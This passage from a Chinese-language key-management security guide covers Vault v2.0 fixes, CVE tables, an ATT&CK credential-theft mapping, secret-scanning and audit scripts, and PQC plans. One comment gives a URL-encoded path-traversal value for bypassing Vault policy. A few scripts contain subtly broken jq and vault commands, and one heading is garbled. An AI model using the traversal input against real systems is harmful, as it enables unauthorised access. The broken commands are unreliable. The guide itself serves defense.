| HSM 集成 | PKCS#11/CloudKMS | CloudHSM | Managed HSM | Cloud HSM |
| 审计日志 | 文件/Syslog | CloudTrail | Diagnostic Logs | Cloud Audit Logs |
| 多云支持 | 是 | AWS only | Azure only | GCP only |
| 开源 | 是（企业功能付费） | 否 | 否 | 否 |

### Vault Secrets 引擎决策树

```
需要存储/管理什么？
├── 数据库凭证 → Database Secret Engine (动态)
├── AWS 凭证 → AWS Secret Engine (动态)
├── TLS 证书 → PKI Engine (动态)
├── 应用密钥/配置 → KV v2 Engine (静态)
├── 加密/解密服务 → Transit Engine (EaaS)
├── SSH 证书 → SSH Engine (OTP/CA)
├── TOTP 验证 → TOTP Engine
└── 通用令牌 → Generic Transit
```

### RSA 密钥轮换时间表

| 密钥用途 | 推荐位长 | 轮换周期 | 存储方式 |
|---------|---------|---------|---------|
| CA Root 密钥 | 4096 | 10-20 年 | HSM 离线 |
| CA Intermediate | 4096 | 3-5 年 | HSM 在线 |
| TLS 服务端证书 | 2048+ | 90 天 | Vault PKI |
| 代码签名 | 4096 | 1-2 年 | HSM + 审计 |
| JWT 签名 | 2048+ | 90 天 | Vault Transit |
| SSH 用户密钥 | 4096 | 1 年 | Vault SSH CA |

### HSM 命令参考

| 操作 | AWS CloudHSM | Azure Key Vault | GCP KMS |
|------|-------------|-----------------|---------|
| 列出密钥 | `pkcs11-tool -O` | `az keyvault key list` | `gcloud kms keys list` |
| 加密 | `pkcs11-tool --encrypt` | `az keyvault encrypt` | `gcloud kms encrypt` |
| 解密 | `pkcs11-tool --decrypt` | `az keyvault decrypt` | `gcloud kms decrypt` |
| 签名 | `pkcs11-tool --sign` | `az keyvault sign` | `gcloud kms asymmetric-sign` |
| 生成密钥 | `pkcs11-tool --keypairgen` | `az keyvault key create` | `gcloud kms keys create` |
| 备份 | `cloudhsm_mgmt_util` | `az keyvault backup` | `gcloud kms keys versions` |
| 审计 | CloudTrail | Diagnostic Logs | Cloud Audit Logs |

---

## MITRE ATT&CK 映射

| 战术 | 技术 ID | 技术名称 | 攻击场景 |
|------|---------|---------|---------|
| Credential Access | T1552.001 | Unsecured Credentials: Files | 从文件系统提取 .vault-token、.pem 密钥文件 |
| Credential Access | T1552.002 | Unsecured Credentials: Registry | Windows 注册表中的密钥 |
| Credential Access | T1552.004 | Unsecured Credentials: Private Keys |窃取 RSA 私钥、PKCS#12 证书 |
| Credential Access | T1552.006 | Unsecured Credentials: Group Policy Preferences | GPP 中的本地管理员密码 |
| Credential Access | T1552.007 | Unsecured Credentials: Container API | Docker API 泄露环境变量密钥 |
| Credential Access | T1558.001 | Steal or Forge Kerberos Tickets: Golden Ticket | 利用泄露的 krbtgt 密钥 |
| Defense Evasion | T1078.004 | Valid Accounts: Cloud Accounts | 使用窃取的 AWS/Azure 动态凭证 |
| Persistence | T1136.003 | Create Account: Cloud Account | 通过 Vault 动态密钥创建云账户持久化 |
| Discovery | T1087.004 | Account Discovery: Cloud Account | 枚举 Key Vault 访问权限 |
| Collection | T1530 | Data from Cloud Storage | 从公开的存储桶获取密钥备份 |

---

## 前置条件

- **HashiCorp Vault**: 1.12+（支持 Raft 存储、自动解封、Identity Groups）
- **Terraform**: 1.0+（Vault Provider 用于基础设施即代码管理）
- **OpenSSL**: 1.1.1+（RSA 密钥生成和证书操作）
- **Cloud CLI**: AWS CLI v2 / Azure CLI 2.40+ / gcloud 400+
- **PKCS#11 工具**: `pkcs11-tool`（HSM 交互）
- **密钥扫描**: TruffleHog 3.95+ / Gitleaks 8.30+

---

## Part C：2025-2026 最新补充

### C.1 HashiCorp Vault v2.0 重大安全更新

Vault v2.0.0（2026-04-14）是首个主版本更新，包含大量安全修复和架构变更。截至 2026-06，最新版本为 v2.0.2。

#### C.1.1 核心安全修复

```bash
# Vault v2.0 关键安全修复清单（截至 v2.0.2）

# 1. AWS Auth 绕过修复 — CVE (auth/aws)
# 攻击者可通过错误的 AWS 客户端缓存绕过 Vault 认证
# 影响：所有使用 AWS Auth Method 的 Vault 实例
# 检测：审计日志中同一 Token 关联多个 AWS 身份
grep '"type":"request"' /var/log/vault/audit.log | \
  jq 'select(.request.path | test("auth/aws/login")) | "\(.time) \(.auth.accessor) \(.request.data)"'

# 2. 证书认证会话固定修复 (auth/cert)
# 证书续期时未验证新旧证书是否匹配同一会话
# 攻击向量：中间人替换续期证书

# 3. Authorization Header Token 泄露修复 (core)
# 旧版 Vault 将 Vault Token 透传给 Plugin 后端
# v2.0 正确移除 Authorization header 中的 Vault Token
# 仅当 "Authorization" 显式列在 passthrough_request_headers 时才转发

# 4. URL 编码路径规范化 (core)
# 拒绝非规范路径的 URL 编码请求，防止路径遍历绕过策略
# 旧版示例：secret/data/app/..%2F..%2Fadmin 可绕过策略
```

#### C.1.2 Token Header DoS 防护

```hcl
# Vault v2.0 新增 max_token_header_size 配置
# 防止通过超大 Token Header 发起 DoS 攻击

listener "tcp" {
  address       = "0.0.0.0:8200"
  tls_cert_file = "/opt/vault/tls/vault.crt"
  tls_key_file  = "/opt/vault/tls/vault.key"

  # 新增：限制 Token Header 大小（默认 8KB）
  # 防止恶意客户端发送超大 X-Vault-Token 或 Authorization: Bearer
  max_token_header_size = 8192  # 字节，-1 禁用限制
}
```

#### C.1.3 依赖链安全修复

```
Vault v2.0 依赖安全修复清单：
├── CVE-2026-34986 / GHSA-78h2-9frx-2jm8  go-jose     → JWT/JWE 签名验证绕过
├── CVE-2026-1229                            circl        → 椭圆曲线密码库漏洞
├── GO-2026-4503                             edwards25519 → Edwards 曲线实现问题
├── CVE-2026-39883                           otel/sdk     → OpenTelemetry SDK 漏洞
├── CVE-2026-39829                           secrets/ssh  → RSA 密钥大小限制（最大 8192 位）
├── GHSA-92mm-2pjq-r785                     go-getter    → 恶意 Git 仓库 RCE
├── GHSA-xmrv-pmrh-hhx2                     aws-sdk-go-v2→ AWS SDK 安全问题
├── GHSA-x744-4wpc-v9h2 / GHSA-pxq6-2prw-chj9 docker/moby→ Docker 依赖迁移
├── CVE-2025-63811                           jose2go      → JOSE 实现漏洞
├── GHSA-f6x5-jh6r-wrfv / GHSA-j5w8-q4qc-rx2x golang/x/crypto → 加密库修复
└── GO-2026-4518 / GHSA-jqcq-xjh3-6g23      pgx/v5      → PostgreSQL 驱动安全修复
```

#### C.1.4 v2.0 架构变更对安全的影响

```bash
# 容器运行环境变更
# v2.0.2 移除了 cap_ipc_lock 能力 → 容器内 Vault 无法调用 mlock()
# 影响：容器部署时内存中的密钥不再锁定，可能被交换到磁盘
# 缓解措施：

# 方案 1：在 Vault 配置中显式禁用 mlock（官方推荐用于容器）
# vault-config.hcl
# disable_mlock = true

# 方案 2：禁用交换分区（确保数据安全）
sudo swapoff -a
# 或在 Docker Compose/K8s 中限制：
# resources:
#   limits:
#     memory: 2Gi
# --memory-swappiness=0

# 方案 3：使用内存加密（Linux kernel 5.x+）
# 通过 memfd_secret() 系统调用保护内存（Vault 未来版本可能集成）
```

### C.2 2025-2026 密钥管理关键 CVE 速查

| CVE | CVSS | 组件 | 描述 | 影响范围 |
|-----|------|------|------|----------|
| CVE-2026-34986 | High | go-jose | JWT/JWE 签名验证绕过 | Vault + 所有使用 go-jose 的 Go 项目 |
| CVE-2026-39829 | Medium | Vault SSH | RSA 密钥大小无上限导致 DoS | Vault SSH Secret Engine |
| CVE-2026-1229 | High | circl | 椭圆曲线密码库漏洞 | Vault + 依赖 circl 的项目 |
| CVE-2025-63811 | High | jose2go | JOSE 实现漏洞 | Vault OTP/auth 插件 |
| CVE-2025-68121 | Critical | Go crypto/tls | Config.Clone 泄漏 session ticket key | 所有 Go TLS 服务（含 Vault） |
| GHSA-92mm-2pjq-r785 | High | go-getter | 恶意 Git 仓库可 RCE | Vault CI/CD 集成 |
| CVE-2026-32289 | High | Go crypto/x509 | 通配符证书验证绕过 | Vault PKI 签发的证书 |

### C.3 密钥扫描工具生态更新

#### C.3.1 工具版本矩阵（2025-2026）

| 工具 | 最新版本 | 发布日期 | 关键更新 |
|------|---------|----------|---------|
| TruffleHog | v3.95.5 | 2026-06-02 | 增强验证引擎 + AI 密钥模式检测 |
| Gitleaks | v8.30.1 | 2026-03-21 | 自定义规则增强 + 性能优化 |
| detect-secrets | v1.5.0 | 2025 | Yelp 开源基线管理 |
| GitGuardian ggshield | v1.40+ | 2025-2026 | AI 误报过滤 + GitHub Action 集成 |
| GitHub Push Protection | GA | 2025-10 | 默认启用密钥推送保护 |
| Bearer | v1.50+ | 2025-2026 | OWASP 兼容 + SAST + 密钥检测 |

#### C.3.2 GitHub Push Protection 与密钥扫描

```bash
# GitHub Push Protection（2025 GA）— 默认启用
# 对推送代码实时检测密钥泄露

# 1. 查看仓库扫描状态
gh api repos/{owner}/{repo}/secret-scanning --jq '.status'

# 2. 自定义密钥模式（企业版）
gh api repos/{owner}/{repo}/custom-properties \
  -f properties[0].name="secret_scanning" \
  -f properties[0].value="enabled"

# 3. 处理推送被阻止的情况
# 如果误报：使用 bypass reason 推送
git push  # 被阻止时，通过 GitHub Web UI 提交 bypass reason

# 4. Secret Scanning Alert 管理
gh api repos/{owner}/{repo}/secret-scanning/alerts --jq '.[] | "\(.number) \(.secret_type) \(.state)"'

# 5. Copilot Secret Scanning AI 增强（2025）
# GitHub Copilot 可自动建议密钥替换方案
# 在 PR Review 中显示密钥修复建议
```

#### C.3.3 TruffleHog 增强检测脚本

```bash
#!/bin/bash
# trufflehog-enhanced-scan.sh — 增强版 TruffleHog 扫描

# 1. Git 仓库深度扫描（含所有分支和提交）
trufflehog git file://./repo \
  --only-verified \
  --filter-entropy=3.5 \
  --concurrency=8 \
  --no-update \
  --format json \
  --output results.json

# 2. 实时 Git 预提交钩子
cat > .git/hooks/pre-commit << 'HOOK'
#!/bin/bash
trufflehog git file://. --since-commit HEAD --only-verified --fail
HOOK
chmod +x .git/hooks/pre-commit

# 3. Docker 镜像扫描
trufflehog docker --image target-image:latest --only-verified

# 4. S3 存储桶扫描
trufflehog s3 --bucket-name target-bucket --only-verified

# 5. 结果分析和统计
python3 -c "
import json
with open('results.json') as f:
    results = [json.loads(line) for line in f]
from collections import Counter
types = Counter(r.get('DetectorName','unknown') for r in results)
print(f'总计发现: {len(results)} 个密钥')
for t,c in types.most_common(10):
    print(f'  {t}: {c}')
"
```

### C.4 Vault v2.0 升级安全清单

```bash
#!/bin/bash
# vault-v2-upgrade-security-check.sh — Vault v2.0 升级安全检查

echo "=== Vault v2.0 安全升级检查清单 ==="

# 1. 检查当前版本
CURRENT_VER=$(vault version)
echo "[INFO] 当前版本: $CURRENT_VER"

# 2. 检查 AWS Auth Method 使用情况
echo "[CHECK] AWS Auth Method 状态..."
vault auth list -format=json | jq -r 'to_entries[] | select(.value.type=="aws") | .key'
# 如果使用 AWS Auth → 必须升级，存在认证绕过漏洞

# 3. 检查 Cert Auth Method
echo "[CHECK] Cert Auth Method 状态..."
vault auth list -format=json | jq -r 'to_entries[] | select(.value.type=="cert") | .key'

# 4. 检查 passthrough_request_headers 配置
echo "[CHECK] 检查 Listener 配置中的 passthrough_request_headers..."
grep -rn "passthrough_request_headers" /etc/vault.d/ /opt/vault/config/ 2>/dev/null
# 如果包含 "Authorization" → v2.0 会正确过滤 Vault Token

# 5. 检查容器环境中的 mlock 设置
echo "[CHECK] 检查 mlock 状态..."
if grep -q "disable_mlock.*=.*true" /etc/vault.d/*.hcl 2>/dev/null; then
  echo "  [OK] disable_mlock = true（容器环境推荐）"
else
  echo "  [WARN] mlock 未禁用，v2.0.2 容器镜像移除了 cap_ipc_lock"
  echo "  建议在配置中添加: disable_mlock = true"
fi

# 6. 检查 SSH Secret Engine RSA 密钥大小
echo "[CHECK] SSH Secret Engine RSA 密钥大小..."
vault secrets list -format=json 2>/dev/null | jq -r 'to_entries[] | select(.value.type=="ssh") | .key' | while read path; do
  echo "  [INFO] SSH Engine: $path — v2.0 限制 RSA 最大 8192 位"
done

# 7. 检查 max_token_header_size 配置
echo "[CHECK] Token Header 大小限制..."
if grep -q "max_token_header_size" /etc/vault.d/*.hcl 2>/dev/null; then
  echo "  [OK] 已配置 max_token_header_size"
else
  echo "  [INFO] 未配置 max_token_header_size，v2.0 默认 8KB"
fi

# 8. 检查插件签名密钥过期
echo "[CHECK] 插件 PGP 签名密钥状态..."
vault plugin list -format=json 2>/dev/null | jq -r '.[] | .name' | while read plugin; do
  echo "  [INFO] 插件: $plugin — v2.0.2 修复了过期 PGP 密钥问题"
done

echo "=== 升级建议 ==="
echo "1. 先升级到 v1.21.4（最终 v1.x 版本），验证功能正常"
echo "2. 测试环境升级到 v2.0.2，逐项验证"
echo "3. 关注 AWS Auth / Cert Auth / Plugin 的行为变更"
echo "4. 容器部署需添加 disable_mlock = true"
echo "5. 更新 TLS 证书（Go 1.26 + crypto/x509 修复）"
```

### C.5 Non-Human Identity (NHI) 密钥治理

Gartner 2026 预测：机器身份数量将是人类身份的 **50 倍**，密钥治理成为关键挑战。

#### C.5.1 NHI 密钥生命周期管理

```bash
# NHI 密钥审计脚本
#!/bin/bash
# nhi-secret-audit.sh — 审计非人类身份密钥

echo "=== NHI 密钥审计 ==="

# 1. Service Account 密钥审计
echo "[CHECK] AWS IAM Access Key 年龄..."
aws iam list-users --query 'Users[].UserName' --output text | tr '\t' '\n' | while read user; do
  aws iam list-access-keys --user-name "$user" --query 'AccessKeyMetadata[] | {[].CreateDate, AccessKeyId}' --output text 2>/dev/null | \
    while read created key_id; do
      age=$(( ($(date +%s) - $(date -d "$created" +%s)) / 86400 ))
      [ "$age" -gt 90 ] && echo "[OLD] User: $user Key: $key_id Age: ${age}d (>90d)"
    done
done

# 2. Azure Service Principal 密钥审计
echo "[CHECK] Azure SP 密钥凭证..."
az ad sp list --all --query "[].{name:displayName,appId:appId}" -o json 2>/dev/null | \
  jq -r '.[] | .appId' | while read sp_id; do
  az ad sp credential list --id "$sp_id" --query "[].{endDate:endDateTime,keyId:keyId}" -o json 2>/dev/null | \
    jq -r '.[] | select(.endDate != null) | "\(.keyId): \(.endDate)"'
done

# 3. GCP Service Account 密钥审计
echo "[CHECK] GCP SA 密钥年龄..."
gcloud iam service-accounts list --format="json" 2>/dev/null | \
  jq -r '.[].email' | while read sa_email; do
  gcloud iam service-accounts keys list --iam-account="$sa_email" --format="json" 2>/dev/null | \
    jq -r '.[] | select(.keyType=="USER_MANAGED") | "\(.name): \(.validAfterTime)"'
done

# 4. Vault Token 审计
echo "[CHECK] Vault 长期 Token..."
vault token lookup -format=json -accessor $(vault list -format=json auth/token/accessors 2>/dev/null | jq -r '.[]' | head -100) 2>/dev/null | \
  jq -r 'select(.data.ttl > 86400) | "[LONG-LIVED] accessor=\(.data.accessor) ttl=\(.data.ttl)s policies=\(.data.policies)"'
```

#### C.5.2 SPIFFE/SPIRVE 寴密钥集成

```bash
# SPIFFE 与 Vault 集成示例
# 使用 SPIFFE ID 替代静态密钥进行工作负载身份验证

# 1. 配置 Vault JWT/OIDC Auth Method 接受 SPIFFE ID
vault auth enable jwt
vault write auth/jwt/config \
  oidc_discovery_url="https://spiffe.example.com" \
  default_role="spiffe-workload"

vault write auth/jwt/role/spiffe-workload \
  role_type="jwt" \
  bound_audiences="vault" \
  user_claim="sub" \
  claim_mappings='{"sub":"spiffe_id"}' \
  token_policies="spiffe-workload" \
  token_ttl=1h

# 2. SPIFFE 工作负载自动获取 Vault Token
# 工作负载通过 SPIFFE Agent 获取 SVID（X.509 或 JWT）
# 使用 JWT SVID 向 Vault 认证
curl -s -X POST https://vault:8200/v1/auth/jwt/login \
  -d "{\"jwt\":\"$(cat /run/spiffe/jwt/svid-token)\",\"role\":\"spiffe-workload\"}"
```

### C.6 后量子密码学 (PQC) 密钥管理准备

NIST PQC 标准已发布（FIPS 203/204/205），密钥管理系统需要为迁移做准备。

```bash
# PQC 密钥管理准备检查清单

# 1. 评估当前密钥算法使用情况
echo "[CHECK] Vault Transit 密钥类型审计..."
vault list -format=json transit/keys 2>/dev/null | jq -r '.[]' | while read key; do
  type=$(vault read -format=json "transit/keys/${key##*/}" 2>/dev/null | jq -r '.data.type // "unknown"')
  echo "  Key: ${key##*/} | Type: $type"
done

# 2. 混合密钥配置（传统 + PQC）
# Vault Transit Engine 支持的类型：aes256-gcm96, chacha20-poly1305, rsa-2048, rsa-4096, ed25519, ecdsa-p256, ecdsa-p384, ecdsa-p521
# 未来版本将支持 ML-KEM (Kyber) / ML-DSA (Dilithium)

# 3. KMS PQC 迁移时间线
echo "=== 云 KMS PQC 支持 ==="
echo "AWS KMS:   支持 PQC 混合密钥 (2025+)"
echo "Azure KV:  支持 PQC 算法 (2025+)"
echo "GCP KMS:   支持 PQC 密钥创建 (2025+)"
echo "Vault:     等待上游 Go PQC 库成熟后集成"

# 4. 优先迁移清单
echo "=== PQC 迁移优先级 ==="
echo "P0: TLS 证书 → 使用混合 KEM（X25519+ML-KEM-768）"
echo "P1: 代码签名 → 使用 ML-DSA-65 替代 RSA-4096"
echo "P2: JWT/JWS 签名 → 使用 ML-DSA + Ed25519 混合"
echo "P3: 数据加密 → AES-256-GCM 仍然安全（对称加密不受量子威胁）"
echo "P4: SSH 密钥 → 使用 ML-DSA 或 SPHINCS+ 替代 RSA"
```

### C.7 中文社区精华参考

| 来源 | 关键内容 |
|------|---------|
| [奇安信 2025 安全态势报告](https://www.qianxin.com) | 密钥泄露为第二常见初始访问向量，占 23% |
| [FreeBuf 密钥管理专题](https://www.freebuf.com) | Vault 集群高可用部署实战 + K8s External Secrets Operator |
| [先知社区 Vault 专题](https://xz.aliyun.com) | Vault Policy 精细化控制 + 多租户隔离方案 |
| [阿里云 AVD](https://avd.aliyun.com) | Go crypto/tls CVE-2025-68121 影响全系列 Go 密钥管理产品 |
| [腾讯云 KMS](https://cloud.tencent.com) | 国内首个支持 PQC 混合密钥的云 KMS 服务 |
| [安全客](https://www.anquanke.com) | 2025 供应链攻击中 41% 涉及密钥/凭证泄露 |
| [长亭科技](https://www.chaitin.cn) | Vault Raft 存储安全加固 + 审计日志 SIEM 集成 |
| [华为云 DEW](https://www.huaweicloud.com) | 国家密钥管理合规（国密 SM2/SM3/SM4）+ HSM 集成 |

### C.8 防御升级路线图

| 优先级 | 项目 | 时间线 | 验证方法 |
|--------|------|--------|---------|
| **P0** | 升级 Vault 到 v2.0.2（修复 AWS Auth 绕过 + Token 泄露） | 立即 | `vault version` + 审计日志验证 |
| **P0** | 启用密钥扫描 CI/CD（TruffleHog/Gitleaks + Push Protection） | 1 周 | 提交测试密钥验证阻止 |
| **P1** | 配置 max_token_header_size 防 DoS | 2 周 | 压测超大 Token Header |
| **P1** | 轮换所有 >90 天的 Service Account 密钥 | 1 月 | NHI 审计脚本 |
| **P2** | 实施 NHI 密钥自动轮换（动态密钥优先） | 2 月 | 验证动态密钥 TTL |
| **P2** | 集成 SPIFFE/SPIRE 工作负载身份 | 3 月 | SPIFFE SVID → Vault 认证 |
| **P3** | PQC 混合密钥迁移规划 | 6 月 | KMS PQC 密钥创建测试 |
| **P3** | 国密 SM2/SM4 合规（如适用） | 6 月 | 国密算法加解密验证 |
